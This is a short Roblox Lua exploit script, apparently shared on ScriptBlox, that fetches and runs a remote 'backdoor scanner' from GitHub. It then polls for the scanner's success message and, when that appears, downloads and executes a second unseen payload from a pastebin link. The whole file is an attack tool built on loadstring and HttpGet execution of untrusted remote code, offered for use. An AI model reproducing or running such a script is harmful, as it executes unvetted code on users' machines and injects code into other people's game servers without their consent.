--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()

while task.wait(1) do
    local message = workspace:FindFirstChildOfClass("Message")
    if message and message:IsA("Message") then
        if message.Text == "LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner" then
            lastMessageText = message.Text

            -- This willpop
            loadstring(game:HttpGet("https://pastebin.com/raw/QfJn3J9A"))()
        end
    end
end
